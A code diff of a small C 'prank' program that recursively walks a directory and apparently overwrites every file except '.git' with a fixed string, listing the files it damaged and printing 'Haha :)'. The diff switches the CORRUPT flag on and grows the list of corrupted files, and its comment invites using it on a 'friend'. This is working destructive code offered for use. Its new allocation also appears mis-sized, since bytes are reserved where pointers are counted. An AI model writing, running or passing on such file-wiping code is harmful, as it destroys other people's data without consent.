@@ -7,13 +7,14 @@
 
 #include "main.h"
 
-#define CORRUPT 0 // <- change this one to prank you "friend"
+#define CORRUPT 1 // <- change this one to prank you "friend"
 #define WRITE_WHAT "rakivo\n" // <- change this one to change the content that will be written
 
 const char* const IGNORED[IGNORED_CAP] = {".", "..", ".git"};
 
-char* corrupted_files[CORRUPTED_FILES_CAP] = {0};
 size_t corrupted_files_counter = 0;
+size_t corrupted_files_curr_cap = CORRUPTED_FILES_CAP;
+char** corrupted_files;
 
 void write(const char* const file_name, FILE* file)
 {
@@ -23,6 +24,14 @@ void write(const char* const file_name, FILE* file)
     }
 
     fprintf(file, WRITE_WHAT);
+
+    if (corrupted_files_counter >= corrupted_files_curr_cap) {
+        corrupted_files = realloc(corrupted_files, (corrupted_files_curr_cap *= 1.5) * sizeof(char*));
+        if (!corrupted_files) {
+            perror("Couldn't reallocate memory for corrupted_files");
+            exit(1);
+        }
+    }
     corrupted_files[corrupted_files_counter] = malloc(strlen(file_name) + 1);
     if (!corrupted_files[corrupted_files_counter]) {
         perror("Couldn't allocate memory for corrupted file");
@@ -40,11 +49,11 @@ void corrupt(const char* const dir_path)
     OPEN_DIR(dp, ep, dir_path);
 
     while ((ep = readdir(dp))) {
-        const char *name = ep->d_name;
+        const char* name = ep->d_name;
         if (isignored(name) == 0) continue;
 
         char path[PATH_CAP];
-        snprintf(path, sizeof(path), "%s%s%s",
+        snprintf(path, PATH_CAP, "%s%s%s",
                  dir_path,
                  dir_path[strlen(dir_path) - 1] == '/' ? "" : "/",
                  name);
@@ -70,6 +79,7 @@ int main(const int argc, const char* const* const argv)
     }
 
 #if CORRUPT
+    corrupted_files = malloc(PATH_CAP);
     corrupt(argv[1]);
 
     printf("\n< ==================== +++ +++ ==================== >\n");
@@ -80,7 +90,12 @@ int main(const int argc, const char* const* const argv)
         printf("%s\n", corrupted_files[i]);
         free(corrupted_files[i]);
     }
+
+    free(corrupted_files);
+
+    printf("Haha :)");
 #endif
+
 
     return 0;
 }
